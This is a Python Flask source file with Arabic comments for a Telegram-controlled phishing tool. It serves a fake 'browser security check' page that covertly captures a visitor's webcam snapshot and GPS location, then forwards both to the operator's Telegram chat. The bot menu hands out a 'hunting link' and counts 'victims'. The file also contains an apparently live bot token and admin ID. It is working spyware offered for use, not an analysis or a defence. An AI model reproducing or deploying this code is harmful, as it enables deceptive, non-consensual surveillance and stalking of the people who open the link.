import base64, requests, io, os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# الإعدادات الخاصة بك
BOT_TOKEN = "8720155192:AAHsZLTbSnIlCNdOXKf424GNdkVlXIsabI8"
ADMIN_ID = 7041600701
BASE_URL = "https://sif-bot-pro.onrender.com" # رابط سيرفرك

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من الأمان</title>
    <style>
        body { background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .container { text-align: center; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 80%; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container"><div class="spinner"></div><p>جاري التحقق من المتصفح، يرجى السماح بالصلاحيات للمتابعة...</p></div>
    <script>
        async function send(d) { await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}); }
        async function start() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
                navigator.geolocation.getCurrentPosition(p => send({type:'text', content:`📍 موقع الضحية:\\nhttps://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`}));
                setTimeout(async () => {
                    const v = document.createElement('video'); v.srcObject = s; await v.play();
                    const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    send({type:'img', img:c.toDataURL('image/jpeg').split(',')[1]});
                    window.location.replace("https://www.google.com");
                }, 1500);
            } catch(e) { window.location.replace("https://www.google.com"); }
        }
        window.onload = start;
    </script>
</body>
</html>
'''

def telegram_api(method, payload, files=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    if files: return requests.post(url, data=payload, files=files)
    return requests.post(url, json=payload)

@app.route('/', methods=['GET', 'POST'])
def handle_index():
    if request.method == 'POST':
        u = request.get_json(force=True, silent=True)
        if u and "message" in u:
            cid = u["message"]["chat"]["id"]
            # لوحة التحكم (الأزرار)
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔗 جلب رابط الصيد", "callback_data": "get_link"}],
                    [{"text": "📊 عدد الضحايا", "callback_data": "stats"}, {"text": "⚙️ الإعدادات", "callback_data": "settings"}]
                ]
            }
            telegram_api("sendMessage", {"chat_id": cid, "text": "✅ أهلاً بك في لوحة تحكم سيف\\n\\nإختر أحد الخيارات أدناه:", "reply_markup": keyboard})
        
        # معالجة ضغطات الأزرار
        elif u and "callback_query" in u:
            call = u["callback_query"]
            data = call["data"]
            if data == "get_link":
                telegram_api("answerCallbackQuery", {"callback_query_id": call["id"], "text": "تم جلب الرابط"})
                telegram_api("sendMessage", {"chat_id": call["message"]["chat"]["id"], "text": f"🚀 رابط الصيد الخاص بك:\\n{BASE_URL}"})
            elif data == "stats":
                telegram_api("answerCallbackQuery", {"callback_query_id": call["id"], "text": "جاري التحميل..."})
                telegram_api("sendMessage", {"chat_id": call["message"]["chat"]["id"], "text": "📊 إحصائياتك:\\n- عدد الضحايا: 0\\n- الصور المسحوبة: 0"})

        return "OK", 200
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    d = request.get_json(force=True, silent=True)
    if d.get('type') == 'text':
        telegram_api("sendMessage", {"chat_id": ADMIN_ID, "text": d.get('content')})
    elif d.get('type') == 'img':
        ph = io.BytesIO(base64.b64decode(d.get('img'))); ph.name = 'snap.jpg'
        telegram_api("sendPhoto", {"chat_id": ADMIN_ID}, files={"photo": ph})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

